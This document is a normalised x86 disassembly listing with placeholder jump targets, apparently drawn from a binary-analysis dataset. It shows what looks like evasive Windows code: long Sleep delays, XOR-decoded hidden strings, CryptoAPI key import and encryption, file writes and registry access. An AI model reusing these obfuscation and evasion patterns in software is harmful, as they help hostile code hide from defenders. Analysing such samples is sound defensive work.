mov esi [ ebp + 0x8 ]
push edi
call sub_10080ad7
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_100808e3
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1007f8f0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_100808b4
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_10080947
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1007f8f0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_100808b4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1005c6a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008939b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9c ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
xor esi esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x85 ] bl
mov [ ebp - 0x98 ] esi
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x8c ]
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x8c ] ebx
cmp [ ebp + 0x24 ] 0x10
mov eax [ ebp + 0x10 ]
jae r-xdata
push 0xdac
call [ Sleep@IAT ]
mov eax 0x43
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x9c ]
mov ecx [ ecx + 0xec ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
lea esi [ ebp - 0x90 ]
push esi
lea esi [ ebp - 0x8c ]
push esi
lea esi [ ebp - 0x94 ]
push esi
mov esi [ ebp + 0x20 ]
push esi
push eax
mov eax [ ebp + 0xc ]
push eax
call edx
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x24
mov esi [ ebp - 0x98 ]
mov eax [ ebp - 0x8c ]
inc esi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov ecx [ r--data ]
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5e
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0x1c
jb r-xdata
xor eax eax
push edi
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x14 ] ax
call sub_1001ddf0
add esp 0x4
push eax
lea edx [ ebp - 0x4c ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x1
call sub_10040e00
add esp 0x4
mov edx eax
mov ecx 0xfa
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x54 ] esi
jb r-xdata
cmp esi 0x5
jg r-xdata
cmp [ ebp - 0x94 ] 0xc8
jne r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx ebx
je r-xdata
xor edx edx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] dx
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x85 ] 0x1
jne r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x8c ] ebx
mov dl [ ecx + eax - 0x1 ]
cmp dl 0xa
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
mov [ ecx + eax - 0x1 ] bl
mov ecx [ ebp - 0x90 ]
mov eax [ ebp - 0x8c ]
dec ecx
mov [ ebp - 0x90 ] ecx
cmp dl 0x20
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
push edx
call sub_1000a86e
add esp 0x4
push eax
lea ecx [ ebp - 0x90 ]
call sub_100386b0
cmp eax ebx
mov eax [ ebp - 0x8c ]
jne r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp - 0x85 ] 0x1
sub_1005c910
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xfb
dec eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ esi ] eax
mov eax [ ecx + 0x1c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x68
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
call sub_1002f620
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1005c98d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
mov [ ebp + 0xc ] eax
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push [ ebx ]
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
push edi
push esi
mov esi [ CryptEncrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_10020fb2
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp + 0xc ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1005ca90
push ebp
mov ebp esp
push 0xffffffff
push sub_10087cb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test cl 0x2
jne r-xdata
test cl 0x4
jne r-xdata
mov edx [ eax + 0x24 ]
cmp [ edx ] edi
je r-xdata
mov ebx 0x7
xor eax eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0x2
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
lea edx [ ebp - 0x48 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10033f90
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov edx [ edx ]
mov ecx [ eax + 0x3c ]
cmp ecx edx
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x48 ]
push eax
mov ecx [ ecx ]
mov edx [ eax + 0x30 ]
mov edx [ edx ]
lea ecx [ ecx + edx * 2 ]
mov edx [ eax + 0x10 ]
mov eax [ edx ]
sub ecx eax
sar ecx 0x1
push ecx
xor edx edx
mov ebx 0x7
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_10034100
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
push ecx
xor edx edx
mov ebx 0x7
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_10034100
mov [ ebp - 0x4 ] edi
mov ecx edx
lea ecx [ ebp - 0x2c ]
xor eax eax
push ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov ecx esi
mov [ esi ] ax
call sub_10033f90
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
call sub_1000a86e
add esp 0x4
sub_1005cbd0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ esp + 0x1c ]
push edx
push esi
call sub_10048610
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1000f103
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_10012150
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
sub_1005cc70
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_1001b2d2
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1005ccb0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ rw-data ]
cmp [ edx + 0xd58 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
mov ebx eax
jne r-xdata
mov ecx [ r--data ]
push esi
xor eax eax
push edi
and eax 0xffffffc5
mov ebx eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xff84
and esi 0xff
mov [ ebp + eax * 2 - 0xc ] si
inc eax
cmp eax 0x2
jb r-xdata
mov edi [ StrStrIW@IAT ]
lea ecx [ ebp - 0xc ]
lea esi [ edx + 0xda0 ]
push ecx
xor eax eax
push esi
mov [ ebp - 0x8 ] ax
call edi
test eax eax
jne r-xdata
and ebx 0xffffffe4
call sub_10030e40
test eax eax
je r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd5
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
xor eax eax
push esi
mov [ ebp - 0x16 ] ax
call edi
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
and ebx 0xfffffffc
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff81
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x3
jb r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
xor eax eax
push esi
mov [ ebp - 0xe ] ax
call edi
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
and ebx 0xfffffff4
sub_1005cdc0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10063b90
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1005cdf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10085080
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov ecx [ ebp + 0x10 ]
xor esi esi
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] esi
mov ecx 0x7
xor edx edx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] eax
cmp [ ebx + 0x48 ] cl
jne r-xdata
push esi
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10004190
mov eax [ ebp - 0x4c ]
mov [ ebx + 0x4c ] esi
cmp eax [ ebp - 0x54 ]
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x44 ] edx
mov ebx 0x7
xor edx edx
lea eax [ ebp - 0x2c ]
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp edi eax
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
lea ebx [ ebp - 0x58 ]
push ebx
mov ebx [ ebp - 0x38 ]
lea ebx [ esi + ebx * 2 ]
push ebx
push esi
lea ebx [ ebp - 0x4c ]
push ebx
mov ebx [ ebp - 0x54 ]
push ebx
mov ebx [ ebp - 0x5c ]
push eax
lea eax [ ebx + 0x44 ]
push eax
mov eax [ edx + 0x10 ]
call eax
test eax eax
js r-xdata
lea esi [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x2c ] esi
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
push edi
call sub_1007ec40
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
add esp 0xc
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x50 ] r--data
call sub_10032538
push r--data
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] r--data
call sub_10055e2a
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_1002d970
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp - 0x58 ]
cmp esi eax
jae r-xdata
cmp eax 0x3
jne r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x10
jae r-xdata
sub eax esi
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_10052290
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp eax esi
je r-xdata
mov [ ebp - 0x2c ] cx
jb r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10004190
mov esi [ ebp - 0x54 ]
mov eax [ ebp - 0x4c ]
mov ecx eax
sub ecx [ ebp - 0x50 ]
mov [ ebx + 0x4c ] ecx
cmp eax esi
jne r-xdata
movzx edx [ eax ]
push edx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10004190
mov eax [ ebp - 0x4c ]
inc eax
mov [ ebp - 0x4c ] eax
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x50 ] r--data
call sub_10032538
push r--data
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x74 ] r--data
call sub_10055e2a
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_1002d970
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
sub_1005d0f3
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001fc6d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1005d190
push ebp
mov ebp esp
push 0xffffffff
push sub_10088baa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4ac ] eax
xor ebx ebx
mov [ ebp - 0x4b8 ] ebx
mov eax 0x1
mov [ ebp - 0x4bc ] eax
mov [ ebp - 0x4b8 ] eax
xor eax eax
mov esi edx
movzx edx ax
mov eax edx
mov [ ebp - 0x4b0 ] ecx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x3d4 ]
[ edi ]
push ebx
xor eax eax
push r--data
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4a8 ] esi
mov [ ebp - 0x4c0 ] ebx
mov [ ebp - 0x4a0 ] ebx
mov [ ebp - 0x4b4 ] ebx
mov [ ebp - 0x3dc ] 0x7
mov [ ebp - 0x3e0 ] ebx
mov [ ebp - 0x3f0 ] ax
call sub_10034100
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push esi
mov [ ebp - 0x4 ] ebx
call [ CreateFileW@IAT ]
mov [ ebp - 0x49c ] eax
cmp eax ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
push 0x1
lea ecx [ ebx + 0x1 ]
lea esi [ ebp - 0x460 ]
call sub_1003d800
add esp 0x4
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x1
call sub_10033f90
mov edi 0x8
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x44c ] edi
jb r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x25
inc cl
mov [ ebp + eax - 0x4a4 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x4a2 ] bl
xor eax eax
lea esp [ esp ]
mov esi [ ebp - 0x4ac ]
lea eax [ ebp - 0x3f0 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10033f90
cmp [ ebp - 0x3dc ] edi
jmp r-xdata
mov ecx [ ebp - 0x460 ]
push ecx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x44
inc cl
mov [ ebp + eax - 0x1cc ] dl
movzx eax cl
cmp eax 0x6f
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x15d ] bl
xor eax eax
lea esp [ esp ]
jb r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x71
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0x19
jb r-xdata
mov edi 0xf
lea eax [ ebp - 0x4a4 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x430 ] edi
mov [ ebp - 0x434 ] ebx
mov [ ebp - 0x444 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x3f0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x4a4 ]
push eax
lea ecx [ ebp - 0x444 ]
call sub_1003e780
lea ecx [ ebp - 0x444 ]
push ecx
lea edx [ ebp - 0x1cc ]
push edx
lea eax [ ebp - 0x460 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100282d0
add esp 0xc
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x40c ]
mov [ ebp - 0x4 ] 0x3
call sub_100063d0
add esp 0x4
mov esi 0x10
cmp [ ebp - 0x44c ] esi
jb r-xdata
mov [ ebp - 0x44c ] edi
mov [ ebp - 0x450 ] ebx
mov [ ebp - 0x460 ] bl
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x430 ] esi
jb r-xdata
mov ecx [ ebp - 0x460 ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0x3f8 ]
mov [ ebp - 0x430 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] ebx
mov [ ebp - 0x444 ] bl
mov eax edi
cmp esi 0x10
jae r-xdata
mov edx [ ebp - 0x444 ]
push edx
call sub_1000a86e
add esp 0x4
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x40c ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov ecx edi
cmp esi 0x10
jae r-xdata
mov esi [ ebp - 0x49c ]
push ebx
lea edx [ ebp - 0x4c4 ]
push edx
push eax
push ecx
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40c ]
call [ CloseHandle@IAT ]
lea esi [ ebp - 0x4b4 ]
lea ebx [ ebp - 0x4a0 ]
mov edx 0x80000001
call sub_100307e0
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
push 0x1
mov ecx 0x1
lea esi [ ebp - 0x428 ]
call sub_1003d800
add esp 0x4
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x7
call sub_10033f90
mov edi 0x8
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x414 ] edi
jb r-xdata
lea esi [ ebp - 0x4b4 ]
lea ebx [ ebp - 0x4a0 ]
mov edx 0x80000002
call sub_100307e0
test eax eax
jne r-xdata
mov esi [ ebp - 0x4a0 ]
mov eax esi
lea edx [ eax + 0x2 ]
mov esi [ ebp - 0x4ac ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x3f0 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10033f90
cmp [ ebp - 0x3f8 ] 0x10
jb r-xdata
mov eax [ ebp - 0x428 ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x420 ]
mov eax 0x41
call sub_10069020
xor ebx ebx
mov esi edx
mov [ ebp - 0x4a0 ] ebx
mov esi [ ebp - 0x4a0 ]
